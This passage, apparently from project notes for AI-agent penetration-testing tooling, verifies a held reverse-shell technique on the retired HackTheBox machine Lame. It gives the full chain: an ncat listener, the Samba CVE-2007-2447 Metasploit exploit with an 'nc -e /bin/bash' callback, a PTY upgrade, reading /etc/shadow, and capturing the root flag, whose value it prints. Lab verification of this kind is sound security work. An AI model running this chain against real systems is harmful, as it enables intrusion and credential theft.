✓ ncat -k tolerates stdin close (no bash-wrap needed unlike ntlmrelayx)
✓ python3 / socat / tee / timeout / ip / od all in nc image
✗ xxd MISSING — gotcha #8 documents od as alternative
✗ ps MISSING (busybox-only?) — list active redirected to bash + ip
✓ tail -f cmd | ncat pipeline form WORKS (Test C verbatim)
✗ < redirect form does NOT work — pipe form is critical
✗ exit\n via cmd_log does NOT cleanup — must use timeout NN wrapper
```

Authored: 2026-05-08 (Phase 0.2, daemon-wrapper retirement series).

---

# Appendix B — HTB Lame live verification (May 2026)

Pattern A.3 (held interactive reverse shell) verified END-TO-END on real
HTB target Lame (10.129.189.252, retired Linux box). Full attack chain:

```
1. Listener container started (Pattern A.3 recipe verbatim):
   docker run -d --name lame-listener --network host \
     -v /tmp/lame-shell:/session \
     --entrypoint bash ghcr.io/silicon-works/mcp-tools-nc:latest \
     -c 'tail -f /session/output/listener-4444/cmd \
          | ncat -lvnp 4444 \
          > /session/output/listener-4444/out 2>&1'

2. Reverse shell triggered via Samba CVE-2007-2447 (msfconsole one-liner):
   exploit/multi/samba/usermap_script
   set RHOSTS 10.129.189.252
   set PAYLOAD cmd/unix/generic
   set CMD nc <tun0_ip> 4444 -e /bin/bash
   exploit

3. Listener captured:
   "Ncat: Connection from 10.129.189.252:43593."
```

## B.1 — root captured + MARKER stability over real network

```
agent appends → /session/output/listener-4444/cmd:
  id; echo MARKER_A_$RANDOM

agent reads /session/output/listener-4444/out:
  uid=0(root) gid=0(root)
  MARKER_A_9478
```

✓ root captured from real reverse shell on real HTB target
✓ MARKER pattern resolved at real network latency

## B.2 — position-tracked delta read across 5 separate spawns

```
SIZE_BEFORE=188 bytes
appended 5 commands → cmd_log
SIZE_AFTER=243 bytes
delta read (tail -c +189):
  cmd_1 / lame
  cmd_2 / lame
  cmd_3 / lame
  cmd_4 / lame
  cmd_5 / lame
```

✓ position-track returns ONLY new bytes — not the cumulative log
✓ confirms gotcha #4 (position-tracked delta read avoiding O(N²) tokens)

## B.3 — PTY upgrade through tail|ncat pipeline

```
agent appends:
  python -c "import pty; pty.spawn(\"/bin/bash\")"
agent appends:
  python -c "import sys; print(\"isatty=\" + str(sys.stdin.isatty()))"

agent reads:
  isatty=True
  root@lame:/#
```

✓ PTY upgrade confirmed against real HTB target
✓ prompt now shows root@lame:/# (PTY-aware, terminal-style)

## B.4 — read /etc/shadow + flag (PTY-required ops)

```
agent appends:
  cat /etc/shadow | head -3
  cat /root/root.txt

agent reads:
  root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
  daemon:*:14684:0:99999:7:::
  bin:*:14684:0:99999:7:::
  ---
  122e732912cee59bc1460f80257a6f88
```

✓ /etc/shadow read via held shell
✓ /root/root.txt = 122e732912cee59bc1460f80257a6f88 (Lame's standard root flag)

## B.5 — full architecture handoff verified

The held-shell pattern from listener-bind through real RCE through real
reverse shell through MARKER + PTY + delta-read + flag-capture all worked
end-to-end on real HTB Lame at 230ms RTT through tun0 VPN. The pattern
from scenarios.md Appendix A.3 is empirically validated against real
infrastructure.

Authored: 2026-05-10 (HTB Lame live verification, daemon-wrapper retirement series).
